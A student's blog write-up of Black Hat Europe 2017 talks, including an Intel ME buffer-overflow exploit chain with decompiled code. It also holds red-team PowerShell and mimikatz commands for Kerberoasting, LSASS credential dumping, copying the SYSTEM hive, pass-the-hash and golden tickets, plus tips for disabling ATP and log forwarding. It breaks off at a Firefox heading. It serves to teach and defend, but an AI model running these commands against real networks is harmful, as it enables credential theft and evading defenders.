# Feeback of Black Hat Europe 2017


Introduction
------------

First of all, thanks, Black Hat to win places for a student! I filled the annual survey and that happens, it’s crazy! Then, me and 3 my friends (see below) went to London!

*   [@GregoireMolveau](https://twitter.com/GregoireMolveau)
*   [@razaborg](https://twitter.com/razaborg)
*   [@L4rg0\_W1nch](https://twitter.com/L4rg0_W1nch)

All briefing was interesting, but the most impressive one was on Intel ME from **Mark Ermolov**, **Maxim Goryachy** and **Dimitry SKLYAROV**

I’ll present this article by day and briefing. At the end of each briefing, I’ll add a personal point of view. So, let’s start! :)

Day 1
-----

### Diplomacy and Combating Evolving International Cyber Threats

* * *

> Chris Painter - State department’s top cyber diplomat

_Chris Painter_ talked about the history of the cyber in his country, and his own history. The presentation highlights something interesting, according to _Chris Painter_, **policy threats** are more often dangerous than **technical threats**.

The world is more and more connected, and everything is connected to the Internet. It’s the main reason why **Wannacry** and **NotPetya** did so much damage in UK (and obviously in other countries). Also, it’s very difficult, even impossible, to assign an attack to a group or state/government. At last, a government does not disclose all information about an attack.

_Chris Painter_ told about worldwide cyber norms during peacetime (1) and wartime to harmonize instructions. Laws processes are too slow, so if you don’t respect norms, there are no sanctions yet…

Another sensitive point is terrorism. _Chris Painter_ said that we have to monitor people to monitor terrorism because they use the internet to communicate with each other, not attacks.

Finally, it’s hard to ask a physical and/or military response to a cyber attack if there is not at least one death.

**From a personal point of view**, it was interesting to see how the UK manages cyber attacks and what is planned for the future.

#### Sources document

1.  Fergus Hanson, _Norms of Cyber War in Peacetime_, Sunday, November 15, 2015. [https://www.lawfareblog.com/norms-cyber-war-peacetime](https://www.lawfareblog.com/norms-cyber-war-peacetime)
2.  Mei Gechlik, _Appropriate Norms of State Behavior in Cyberspace: Governance in China and Opportunities for US Businesses_, Aegis Series Paper No. 1706. [https://www.hoover.org/sites/default/files/research/docs/gechlik\_webreadypdf.pdf](https://www.hoover.org/sites/default/files/research/docs/gechlik_webreadypdf.pdf)
3.  Wikipedia, _Colossus computer_. [https://en.wikipedia.org/wiki/Colossus\_computer](https://en.wikipedia.org/wiki/Colossus_computer)

### By-design Backdooring of Encryption System - Can we trust Foreign Encryption Algorithms

* * *

> Arnaud BANNIER & Eric FILIOL (speaker) from ESIEA

Few countries (French, Germany, thee UK and so on) are asking for encryption backdoor law (2⁄3) in IoT. Since World War 2, there is a government (G-20 countries now) control on cryptography.

_Eric FILIOL_ says that there are differences between **trapdoor** and **backdoor**.

*   **Trapdoor**: Feature of asymmetrical encryption.
*   **Backdoor**: Unwanted feature for attacker benefits.

In mathematical backdoors, there is two type of weaknesses.

*   **Natural**: For example, elliptic curves with specific points.
*   **Intended**: Intentional misconception.

Now, the question is: Can we trust cryptographic algorithms from a third-party country?

There are not many choices in cryptography, for public symmetrical and secure algorithms, we have only AES at this time.

_Eric FILIOL_ advises us to read **Verschlüsselt, Der Fall Hans Bühler**. This book talks about an Iranian guy that proves cryptographic algorithms were backdoored. At this time, algorithms were not public, this man was arrested in 1992.

The NSA did a new cryptographic algorithm for IoT, but after pressure, from experts and corporate, ISO rejected the standard.

The researcher _Eric FILIOL_ talked about the BEA-1 algorithm and how is it possible to inject a mathematical backdoor.

His presentation (1) present all the process, I let you check it :)

**From a personal point of view**, this presentation was a good introduction to backdoors in encryption algorithms. But, honestly, I didn’t understand everything :-)

#### Sources documents

1.  Arnaud BANNIER & Eric FILIOL, _Black Hat presentation_, Wednesday, December 6, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Filiol-By-Design-Backdooring-Of-Encryption-System-Can-We-Trust-Foreign-Encryption-Algorithms.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Filiol-By-Design-Backdooring-Of-Encryption-System-Can-We-Trust-Foreign-Encryption-Algorithms.pdf)
2.  Kieren MCCARTHY, _French, German ministers demand new encryption backdoor law_, August 26, 2016. [https://www.theregister.co.uk/2016/08/24/french\_german\_ministers\_call\_for\_new\_encryption\_backdoor\_law/](https://www.theregister.co.uk/2016/08/24/french_german_ministers_call_for_new_encryption_backdoor_law/)
3.  James VINCENT, _UK government renews calls for WhatsApp backdoor after London attack_, March 27, 2017. [https://www.theverge.com/2017/3/27/15070744/encryption-whatsapp-backdoor-uk-london-attacks](https://www.theverge.com/2017/3/27/15070744/encryption-whatsapp-backdoor-uk-london-attacks)
4.  Cryptographic laws in different countries. [http://www.cryptolaw.org/](http://www.cryptolaw.org/)

### Intel ME: Flash File System Explained

* * *

> Dimitry SKLYAROV - Positive Technologies

_Dimitry SKLYAROV_ starts his presentation by introducing the Intel Management Engine and the hierarchy in a computer.

Hierarchy of a computer:

1. User
2. OS Kernel
3. Hypervisor
4. System Management Mode (SMM)
5. Management Engine (ME)

Top layer (user) has limited permission on the under layer (OS Kernel) and this mecanism works until the fifth layer. On the other hand, the under layer has full access on the top one.
Then, from 1 to 5 -> limited access and from 5 to 1 -> Full access.
To conclude, Intel ME got full access to the machine.

I let you imagine what happens if malware goes into the ME. The ME is a standalone electronic chip before the CPU, it interacts with all other components.

_Dimitry SKLYAROV_ says that before trying to flash the Intel ME, you have to erase it completely. But, there is a limited number of cycles (between 10 000 and 1 000 000). After this limit, the ME is unusable.

Intel made design the flash with incremental modification to avoid redundantly erases and distribute erases between block as evenly as possible to preserve the ME.

After the introduction, _Dimitry SKLYAROV_ talked about **MFS pagination**. Inside the ME, all MFS page has the same size (8192 bytes), starts with the same header (0xAA557887) and there is always an empty page.

|Signature|USN|nErase|iNextErase|firstChunk|csum|0x00|
|---------|---|------|----------|----------|----|----|

* Signature: Always 0xAA557887
* USN: Update Sequence Number
* nErase: How many times page has been erased
* iNextErase: Index of next to be erased page
* firstChunk: Index of first chunk (for Data page)
* csum: Checksum

Each page contains 66 bytes chunks, it’s an addressable and modifiable unit in the page of the MFS. Those chunks contain 2 bytes of checksum at the end (CRC-16).

_Dimitry SKLYAROV_ mentions that reversing CRC-16 allows easy calculation of the chunk index. By the way, _indexing_ is the reason why checksum is different for the same data.

Just after the header chunk, there is the **system chunk**. As the _Dimitry SKLYAROV_ picture shows below, this chunk is composed of:

* Chunk# 0x1201: Chunk full of zero
* Chunk# 0x1202: Two first bytes at `F4 D4` followed by a complete chunk full of zero
* Chunk# 0x1203: Two first bytes at `A7 B1` followed by a complete chunk full of zero
* Chunk# 0x1204: Two first bytes at `96 B2` followed by a complete chunk full of zero
* ...

**axIdx** is a 16 bits array, entries of this array are the number of chunks + 1 and it is dynamically XORed. The key value depends on the previous value from **axIdx**. You can recover it by reversing CRC-16 function (in fact, it’s a modified algorithm stripped to 14 bits).

Data pages are easier to understand. After the header page, there is the **aFree** bit. This bit tells if the data chunk contains something or not (**aFree\[i\] == 0xFF**).

Each Data chunk is stored once with a sequential number started from the first chunk.

System chunks are stored accords to the update order, not sequentially. Then, an index from System page is derived from **axIdx** value.

Now, to extract data, _Dimitry SKLYAROV_ explains that you have to follow this diagram:

|Diagram					|
|-----------------------------------------------|
|int32 - Volume Signature (0x724F6201)          |
|int32 - Volume Version ?             		|
|int32 - Total capacity: System area + Data area|
|int16 - Number of files records		|
|int16 - File allocation table			|

Low-Level MFS does not support file names. Files are identified by numbers (from 0 to nFiles-1). Let _Dimitry SKLYAROV_ explains his diagram:

1.  Calculate the index in File Allocation Table: **ind = aFAT\[iFile\]**. Values 0x0000 for unused and 0xFFFE for erased means that file does not exist and values 0xFFFF means empty file.
2.  **ind** must be between **nFiles** and aFAT length.
3.  Extract chunk data
4.  Calculate the next index
5.  If the new value is between 0 and chunk size MFS, then output first **ind** bytes of data and goes to the end of the process.
6.  Output all 64 bytes of data and processes to step 2.

After that, _Dimitry SKLYAROV_ did an MFS template from **fit.exe**.

Then MFS is composed of:

![](/lib/images/articles/bheu2017/me4.png)

_Dimitry SKLYAROV_ attentions was on _Slot 6_, containing the **intel.cfg** file. This file is necessary for ME deployment at the first run. Here is the structure:

|File #  |Description |
|--------|------------|
|2,3|AR (Anti-Replay) table|
|4|Used for migration after SVN (Secure Version Number) upgrade|
|5|File System Quota storage (related to User info metadata extension for `vfs` module|
|6|`/intel.cfg` file (default state of FS configured by Intel). SHA256 of `intel.cfg` is stored in System Info manifest extension|
|7|`fitc.cfg` file (vendor-specific FS configuration). Can be created by platform vendor using Intel's Flash Image Tool (fit.exe)|
|8|`/home/` directory (starting directory for ME files stored in MFS)|

Below a partial dump of the **intel.cfg**:

|Diagram|
|-------|
|int32 - Number of records|
|File Name (char name[12])|
|int16 - unused, always 0|
|int16 - Access mode|
|int16 - Deploy options|
|int16 - File data length|
|int16 - Owned user ID (UID)|
|int16 - Owner group ID (GID)|
|int32 - File data offset|
|int8 - File data|

Letters in **mode** and **opt** field means:

![](/lib/images/articles/bheu2017/mode_and_opt_field_means.png)

An MFS directory is just an array of records describing containing files. MFS file #8 always represents the **/home/** directory. Here is the structure:

|Struct - T_MFS_Folder_Record|
|----------------------------|
|int32 - filenoi (FS, salt, iFile)|
|int16 - mode (Access mode)|
|int16 - uid (Owner User ID)|
|int16 - gid (Group User ID)|
|int16 - salt (Another salt)|
|name[12] - File name|

And a dump of the password manager located in the **home/policy/pwdmgr/** directory:

![](/lib/images/articles/bheu2017/homepolicypwdmgr.png)

Meaning of **fileno**:

|Bits|Description of `fileno` fields|
|----|------------------------------|
|11..0|iFile (0..4095)|
|27..12|16 bits of salt|
|31..28|FileSystem ID (always 1)|

and **mode**:

|Bits|Description of `mode` fields|
|----|----------------------------|
|8..0|`rwxrwxrwx` Unix-like rights|
|9|`I` Enable integrity protection|
|10|`E` Enable encryption|
|11|`A` Enable anti-replay protection|
|13|`N` Use non-Intel keys|
|15..14|`d` Record type (0: file, 1: directory)|

If bit 9 (for _integrity_) is set in the **mode** field, raw file contains additional security blob. It is added to the **Anti-replay** tables (iFile == 2,3) and **/home/** directory (iFile == 8).

The final part of the _Dimitry SKLYAROV_ presentation was about **File system security keys**. There are up to 10 security keys involved in protecting the MFS content.

Replay-Protected Monotonic Counter is a feature of the SPI flash. If this feature is unavailable, then the ME implements its own counter. There are two keys to handle RPMC, **RPMC HMAC keys**.

Two more keys are used to protect Integrity and Confidentiality. Moreover, there are two sets of keys: **Intel keys** and **Non-intel keys** (motherboard manufacturer keys).

Surprisingly enough, Intel keys are used in rare modules (sigma, ptt, dal\_ivm, mca).

It’s possible to derive keys, and Secure Key Storage is allowed for ROM, bup and crypto modules.

Knowing **GEN** secret for non-intel keys (via JTAG) allows to read/write on the MFS. If we can execute code into **bup** module, then it is possible to recover intel keys.

**From a personal point of view**, I loved this presentation! I’m very interested in Intel ME and how it works. After the briefing, a lot of things were much clearer to me.

#### Sources documents

1.  Dimitry SKLYAROV, _Flash File System Explained_, Wednesday, December 6, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained-wp.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained-wp.pdf)
2.  Dimitry SKLYAROV, _Black Hat Presentation_, Wednesday, December 6, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Sklyarov-Intel-ME-Flash-File-System-Explained.pdf)
3.  Intel Reference Guide, _Intel AMT Release 2.0/2.1⁄2.2 Architecture_. [https://software.intel.com/sites/manageability/AMT\_Implementation\_and\_Reference\_Guide/default.htm?turl=WordDocuments/intelamtrelease202122architecture.htm](https://software.intel.com/sites/manageability/AMT_Implementation_and_Reference_Guide/default.htm?turl=WordDocuments/intelamtrelease202122architecture.htm)
4.  Xiaoyu Ruan, _Platform Embedded Security Technology Revealed_. [https://link.springer.com/content/pdf/10.1007%2F978-1-4302-6572-6.pdf](https://link.springer.com/content/pdf/10.1007%2F978-1-4302-6572-6.pdf)
5.  Igor Skochinsky, _Intel ME Secrets_. [https://recon.cx/2014/slides/Recon%202014%20Skochinsky.pdf](https://recon.cx/2014/slides/Recon%202014%20Skochinsky.pdf)
6.  Positive Technologies, _Intel ME: The Way of the Static Analysis_. [https://www.troopers.de/downloads/troopers17/TR17\_ME11\_Static.pdf](https://www.troopers.de/downloads/troopers17/TR17_ME11_Static.pdf)
7.  Positive Technologies, _\[Github\] Intel ME 11.x Firmware Images Unpacker_. [https://github.com/ptresearch/unME11](https://github.com/ptresearch/unME11)

### Nation-State Moneymule’s Hunting Season - APT Attacks Targeting Financial Institutions

* * *

> Min-Chang Jang (speaker), Chi-en Shen (speaker) & Kyoung-Ju Kwak from KFSI & Team T5

They started to introduce different groups and made a timeline of different attacks:

![](/lib/images/articles/bheu2017/apt1.png)

![](/lib/images/articles/bheu2017/apt2.png)

### Korea Major Bank Attack By Bluenoroff

In March 2017, the Korea major bank has been attacked. Targets were employees in charge of the SWIFT system. **Bluenoroff** found a 0day in a file sharing function in VDI Program (4).

_No severe damage and only 2 PC infected_

![](/lib/images/articles/bheu2017/apt3.png)

Malware used is in **Manuscrypt** family. 

* Research for SWIFT network. 
* Activate NamedPipe of a specific process. 
* Look for desired data and send them to C&C server.

IP was hidden in a plain registry key. Data sent to the C2 were encoded.

And here is how analyst were able to decode the data:

![](/lib/images/articles/bheu2017/apt4.png)

### ATM Operator Company Break aka VANXATM

The operation started from Feb 2015 and leakage in March 2017. The target is ATM Operator Company (manage more than 2000 ATM).

Andareil group used a 0day in AV and misconfiguration/mismanagement between ATM machines and ATM update server.

230 000 credit card information leaked.

![](/lib/images/articles/bheu2017/apt5.png)

Malware **fs.exe**: 

* Scan AV server’s service port 
* Connect to server 
* Send file 
* Run file 
* Look for Transaction date/time, account number issuers, request amount and balance.

For the VANXATM case, Andariel group targeted only 64 ATM, because they have plain credit card information on a FTP.

### Bitcoin Exchanges Hacked

Four Bitcoin exchanges were attacked. Attacker impersonates the public institutes for phishing and they used nine email accounts for attack (4 out 9 were stolen).

Mobile malware to bypass SMS authentication.

Sample hash: 22a279c5685d7c3e24c04580204a8a932b2909a77a549bdd7bcf7ead285efde9

They used Ghostscript vulnerability (kind of macro attack).

![](/lib/images/articles/bheu2017/apt6.png)

![](/lib/images/articles/bheu2017/apt7.png)

Personal point of view, malware developed by those groups are not “complicated”. They’re not (or few) obfuscated, the real exploit is the recon step.

They can use cryptocurrencies to buy C&C server, to be more difficult to find. Bitcoin obtained via stole or ransomed action.

According to McAfee, Lazarus moved to mobile platforms (2). Unit 42 from Palo Alto discovered a cluster of malware, which targets Samsung devices and Korean Languages speakers (3).

Andariel acts during company activity, to be quieter during the attack.

**From a personal point of view**, it is pretty cool to see how this kind of attack is defeated, and how those cybercriminals planned their actions. I’m just a bit surprised by malware developed by those groups, they are not encrypted or very hard to reverse.

#### Sources documents

1.  Chi-En Shen, Min-Chang Jang & Kyoung-Ju Kwak, _Black hat presentation_, Wednesday, December 6, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Shen-Nation-State%20Moneymules-Hunting-Season-APT-Attacks-Targeting-Financial-Institutions.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Shen-Nation-State%20Moneymules-Hunting-Season-APT-Attacks-Targeting-Financial-Institutions.pdf)
2.  Christian Beek, _Lazarus Cybercrime Group Moves to Mobile Platform_, November 20, 2017. [https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-cybercrime-group-moves-to-mobile/](https://securingtomorrow.mcafee.com/mcafee-labs/lazarus-cybercrime-group-moves-to-mobile/)
3.  Anthony Kasza, Juan Cortes, and Micah Yates, _Operation Blockbuster Goes Mobile_, November 20, 2017. [https://researchcenter.paloaltonetworks.com/2017/11/unit42-operation-blockbuster-goes-mobile/](https://researchcenter.paloaltonetworks.com/2017/11/unit42-operation-blockbuster-goes-mobile/)
4.  TechNet Archive, _Using a Host-Guest communication channel in Windows Virtual PC_, October 13, 2009. [https://blogs.technet.microsoft.com/windows\_vpc/2009/10/13/using-a-host-guest-communication-channel-in-windows-virtual-pc/](https://blogs.technet.microsoft.com/windows_vpc/2009/10/13/using-a-host-guest-communication-channel-in-windows-virtual-pc/)

### How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine

> Mark Ermolov & Maxim Goryachy from Positive Technologies

They revealed CVE-2017-5705,6,7 (3). As _Mark Ermolov_ [tweet](https://twitter.com/_markel___/status/938166256322129921) says, their vulnerability depends on MFS.

There are few vulnerabilities in the ME, but only 1 allows execution of arbitrary code on ME! But, now, there is two.

Potentials attack vectors:

*   **Local communication interface (HECI)**: Separated PCI device, it exchanges messages between the main system and the ME.
*   **Network (vPro only)**: ATM is a large module, so a lot of code. But only available in business systems.
*   **IPMI/MCTP**: ??
*   **Host memory (UMA)**: AES encryption with integrity checking.
*   **Firmware SPI layout**: Needs intel private key to exploit a bug in parsing procedure of signed data. Moreover, the firmware is not vulnerable to “evil SPI flash” attack in general.
*   **Internal file system**: It refers to the previous briefing by _imitry SKLYAROV_

The architecture of the ME shows 2 issues:

*   A process can create another process which is more privileged than itself.
*   Access to internal devices completely breaks the security model.

In high privileged modules, we meet **BUP**, as we saw with first ME briefing.

**BUP** can create a child process, and of course, choose its privilege. Also, this module exists on all platforms, has access to security sensitive hardware, can bypass MFS protection, one of the largest modules (more code = more attack vector) and interacts with the host via HECI.

In the processing of reverse engineering, they find a buffer overflow vulnerability in the **Trace hub initialization**. Here is the function code:

```c
    void __cdecl bup_init_trace_hub ()
    {
        int err; // eax 
        eax signed int npk_reg_idx; // ebx 
        ebx unsigned int bytes_read; // [esp+0h] [ebp-350 h]
        unsigned int file_size; // [esp+4h] [ebp-34 Ch] 
        int si_features[5]; // [esp+8h] [ebp-348 h] 
        int ct_data[202]; // [esp+1Ch] [ebp-334 h] 808 bytes 
        int cookie; // [esp+344h] [ebp - Ch] 
    
        cookie = gRmlbCookie;
        memset (si_features, 0, 0x14u);
        bytes_read = 0;
        file_size = 0;
        if (!(getDW_sel (0xBF,0xE0u) & 0x1000000) 
            && !bup_get_si_features (si_features) 
            && !bup_dfs_get_file_size ("/home/bup/ct", &file_size)) {
                if (file_size){
                    LOBYTE (err) = bup_dfs_read_file ("/home/bup/ct", 0, ct_data, file_size, &bytes_read);
                    npk_reg_idx = 0;
                  
                    if (!err) {
                      while (npk_reg_idx < HIWORD (ct_data[1]))
                        {
                            if (HIBYTE (ct_data[2 * npk_reg_idx + 2]) == 1)         
                                putDW_sel (0xB7, ct_data[2 * npk_reg_idx + 2] & 0xFFFFF, ct_data[2 * npk_reg_idx + 3]);
                            if (HIBYTE (ct_data[2 * npk_reg_idx + 2]) == 2)
                                putDW_sel (0xBF, ct_data[2 * npk_reg_idx + 2] & 0xFFFFF, ct_data[2 * npk_reg_idx + 3]);  
                            ++npk_reg_idx;
                        }
                      bup_switch_tracer (0xB7, 0xBF u);
                    }
                }
            }
      if (gRmlbCookie != cookie)
        sys_fault ();
    }
```    

So the vulnerability is here, but there is a stack protection against buffer overflow, the **stack cookie**:

```c
    void __cdecl bup_init_trace_hub ()
    {
        [...]
        int ct_data[202]; // [esp+1Ch] [ebp-334 h] 808 bytes 
        int cookie; // [esp+344h] [ebp - Ch] 
    
        cookie = gRmlbCookie;
        [...]
        if (!(getDW_sel (0xBF,0xE0u) & 0x1000000) 
            && !bup_get_si_features (si_features) 
            && !bup_dfs_get_file_size ("/home/bup/ct", &file_size)) {
                if (file_size){
                    LOBYTE (err) = bup_dfs_read_file ("/home/bup/ct", 0, ct_data, file_size, &bytes_read);
        [...]
        if (gRmlbCookie != cookie) // Stack protection
            sys_fault ();
    }
```   

The **/home/bup/ct** is an unsigned file from **fitc.cfg** (cf. First presentation):

![](/lib/images/articles/bheu2017/me5.png)

The _stack cookie_ implements:

*   Each process has unique value for stack cookie
*   32 bits value is obtained from hardware random number generator
*   Stored is nonvolatile process memory
*   If cookie changed, the process exited

To bypass the protection they decided to intercept the execution flow and exploit the buffer overflow before the cookie checking.

To do that, in the code above, we can see the **bup\_dfs\_read\_file** that indirectly call a **memcpy** function. Then, they have the destination address of the structure they named **Tread Local Storage** (TLS). In _BUP_ read/write functions obtains and records data via a shared memory mechanism. Because _BUP_ interacts with _MFS_ though another module **file system driver**. The TLS region can be overwritten by a read function, and then bypass the buffer overflow protection.

|Code flow|
|---------|
|bup_init_trace_hub|
|bup_dfs_read_file|
|bup_read_mfs_file|
|sys_write_shared_mem|

The TLS structure looks to:

![](/lib/images/articles/bheu2017/me3.png)

And now, the serious problem architecture is that the TLS structure is stored at the bottom of the stack. Then you can erase the **gs:\[0\]**, the self-pointer and generate a new structure, it allows an attacker to write arbitrary data.

Here is a diagram of the stack (from presentation (1)):

![](/lib/images/articles/bheu2017/me1.png)

Now, _Mark Ermolov & Maxim Goryachy_ tells us how to get an arbitrary write primitive. They “just” rewrite (there is no ASLR) the return address of memcpy to hijack the program control flow.

![](/lib/images/articles/bheu2017/me2.png)

But, **Stack is nonexecutable**, then they create their own module and integrate it into the firmware. This module used ROP gadgets to:

*   Load the module into memory
*   Create new process with highest privileges

Is remote exploitation possible?

Yes, if:

*   AMT is enabled and attacker known password (or use CVE-2017-5689)
*   BIOS has “Flash rewrite enable” option
*   BIOS password is blank or known

Updates systems are not out of danger because the firmware downgrade to a vulnerable version is possible, but it needs a physical access to the target.

TLS is still at the same place, even after the update.

**From a personal point of view**, this presentation was just awesome, it’s the presentation that I enjoyed the most. I think in my final year at school, I will take the Intel ME as a research paper.

During Demo Time, they played a video showing a big “GAME OVER” blinking on the screen at boot (not at windows boot, at computer boot, so we could see the message before the loading screen of Windows).

#### Sources documents

1.  Mark Ermolov & Maxim Goryachy, _Black hat presentation_, Wednesday, December 6, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine.pdf)
2.  Mark Ermolov & Maxim Goryachy, _\[Paper\] How to Hack a Turned-Off Computer, or Running Unsigned Code in Intel Management Engine_. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf)
3.  CVE-2017-5705, [https://nvd.nist.gov/vuln/detail/CVE-2017-5705](https://nvd.nist.gov/vuln/detail/CVE-2017-5705)
4.  CVE-2017-5706, [https://nvd.nist.gov/vuln/detail/CVE-2017-5706](https://nvd.nist.gov/vuln/detail/CVE-2017-5706)
5.  CVE-2017-5707, [https://nvd.nist.gov/vuln/detail/CVE-2017-5707](https://nvd.nist.gov/vuln/detail/CVE-2017-5707)
6.  CVE-2017-5689, [https://nvd.nist.gov/vuln/detail/CVE-2017-5689](https://nvd.nist.gov/vuln/detail/CVE-2017-5689)

### Goodies hunting part 1

At the end of the first day, with [@razaborg](https://twitter.com/razaborg) we tried some challenge offered by companies in the business hall, and getting some goodies!

The challenge tested (by a company whose I forgot the name, really sorry :X), was an IP camera inside a box with digital code protection. Numbers were hidden on the presentation stand, we find 3 on the 6, not enough, unfortunately…

Day 2
-----

### Red Team Techniques for Evading, Bypassing, and Disabling MS Advanced Threat Protection and Advanced Threat Analytics

> Chris THOMPSON (@retBandit) from IBM X-Forced Red

Step in a red team mission:

*   External recon
*   Gain a Foothold
*   Host recon
*   Internal recon
*   Lateral movement
*   Dominance

Obfuscated PowerShell script triggered Advanced Threat Protection (ATP). ATP includes machine learning and AMSI.

> Defender ATP =/= Defender AV

Misc techniques to gain the initial foothold: \* Obfuscated JScript/VBScript THAT DON’T USE **KERNEL32 API**. \* Using signed exec’s to load a Cobalt stageless payload. \* Some executables created with Veil (Go) and Shellter.

**Not detected**: WMI

```powershell
wmic process list brief
wmic group list brief
wmic computersystem list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get *
Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'"
```    

Use MSF modules with local WinAPI calls, such as **file\_from\_raw\_ntfs.rb**, don’t use **local\_admin\_search\_enum.rb**.

CobaltStrike has a number of modules that are API-only.

**Avoid AMSI**

Userland Persistence and AMSI Bypass via Component Object Model Hijacking.

ATP can’t be stopped or uninstalled, even with a SYSTEM account, because of Protected Process Light.

But it’s possible to block ATP communications via DiagTrack Service. Hijack DLL to remove PPL protection? (personal note: not sure)

Mimikatz driver is registered as malicious now, but you change the service name and re-sign it.

It’s possible to block all Windows Defender/ATP Comms via Firewall (1 page 42)

**Not detected**: Using LDAP/Powerview to gather computers/users.

```powershell
Get-NetComputer -verbose -domain prod.local
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain dev.local -verbose
```    

**Not detected**: Enumeration via WMI Local Name Space

Domain User Accounts:

```powershell
Get-WmiObject -Class Win32_UserAccount -Filter "Domain='dev' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired, PasswordChangeable, Description, SID
```

Domain Groups:

```powershell
Get-ComInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name like '%Admin%'"
```    

Domain Group User Memberships:

```powershell
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name='Enterprise Admins'" | Get-CimAssociatedInstance - Association Win32_GroupUser    
Get-CimInstance -ClassName Win32_Group -Filter "Domain = 'dev' AND Name='Microsoft Advanced Threat Analytics Administrator'" | Get-CimAssociatedInstance - Association Win32_GroupUser
```

**Not detected**: SPN Enumeration & Kerberoasting

```powershell
Get-NetComputer -SPN mssql*
Get-NetUser -SPN | Get-SPNTicket -OutputFormat Hashcat
```    

**Not detected**: Silver ticket

The golden ticket is a forged TGT, Silver ticket is a forged TGS. No DC server contacted.

**Not detected**: Enumerating AD Access Control Entries

```powershell
Invoke-BloodHound -CollectionMethod ACL -ExcludeDC
```     

**Not detected**: Escalation via Selective AD ACL Abuse

```powershell
Add-DomainGroupMember -Identity sql01admins -Members edwardabbey
Set-DomainUserPassword -Identity webservice -AccountPassword$Password
```      

Over-Pass-The-Hash is detected using KRBTGT NTLM hash.

**Not detected**: Over-Pass-The-Hash using all hash/keys.

In a mimikatz console:

```powershell
sekurlsa::pth /user:administrator /domain:prod.local /aes256:<data> /ntlm:<hash> /aes128:<data>
```     

Lateral movement via SQL Auth is not detected.

For the dominance.

**Not detected**: PowerSploit: Mimikatz in memory w/ LSASS injection

```powershell
Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject"' -Computer dc03.prod.local
```      

**Not detected**: PowerSploit: Ninja-Copy (PSRemoting with Raw Disk Access)

```powershell
Invoke-NinjaCopy -Path "c:\Windows\System32\config\SYSTEM" -ComputerName "dc03.prod.local" -LocalDestination "c:\temp\system"
```      

**Not detected**: Golden ticket w/ AES Key

In mimikatz console:

```powershell
kerberos::golden /user:JohnVanwagoner /domain:prod.local /sid:sid /aes256:aes256 /groups:512,513,519 /startoffset:-1 /endin:2500 /renewmax:3000 /ptt
```    

|Red Team Takeaways|
|------------------|
|Return to living off the land, directly call APIs|
|Leverage host based PowerShell tools only after you've blocked or disabled ATP & event log forwarding|
|Review RDP/PS/Session history to help avoid user behavior analytics|
|Block event log forwarding to prevent Sysmon/WMI/PowerShell/Security logs giving you away|
|Use ACE/DACL abuse to help avoid using RCE when possible|
|Focus on info gathering and lateral movement techniques that don't comm with the DC, liks SQL auth and Silver Tickets|
|Kerberoast & Silver Ticket all the things|
|Use AES for Over-PTH, Golden Tickets|
|Abuse Forest Trusts|

|Blue Team Takeaways|
|-------------------|
|Limit PS Remoting sources to dedicated admin workstations|
|Use JEA (Just Enough Administration) to help prevent lateral movement success|
|Harden SQL servers, review forest trusts|
|Integrate SIEM/VPN logs into ATA|
|Use Event Log Forwarding for Sysmon and WMI logging with shorter polling times|
|Audit your AD object ACLs with BloodHound|
|Enforce AES-256, especially for service account SPNs|
|Enforce "Binary Signature Policy" in 1703 to help protect PPLs|
|Integrate those new Defender branded tools like Exploit Guard (WDEG)|
|Enforce EMET/WDEG's Attack Surface Reduction (ASR) rules|

**From a personal point of view**, being a pentester, this presentation was one of the most interesting. I didn’t even know ATA and ATP before the briefing. Maybe I will build a little lab to test all of this.

#### Source documents

1.  Chris THOMPSON, _Black hat presentation_, Thursday, December 7, 2017. [https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Thompson-Red-Team-Techniques-For-Evading-Bypassing-And-Disabling-MS-Advanced-Threat-Protection-And-Advanced-Threat-Analytics.pdf)
2.  Andy Robbins, _\[GitHub\] BloodHoundAD_, September 19, 2016. [https://github.com/BloodHoundAD/Bloodhound/wiki](https://github.com/BloodHoundAD/Bloodhound/wiki)

### Breaking Out HSTS (and HPKP) on Firefox, IE/Edge and (Possibly) Chrome

> Sheila Ayelen Berta & Sergio De Los Santos from ElevenPaths

Most of the MITM attacks doesn’t work anymore today. That’s why HSTS and HPKP are created.

When a user is connected to an HSTS website, the first time the client connects to the port 80 of the website and he is redirected to the 443 port. With HSTS, next time client connects to the website, it will be automatically on the 443 port, then SSLStrip is useless.

HPKP will get the certificate signature, or “certificate pinning” and compares it at every connection. If the signature is modified, then the browser drop the connection.

#### Firefox

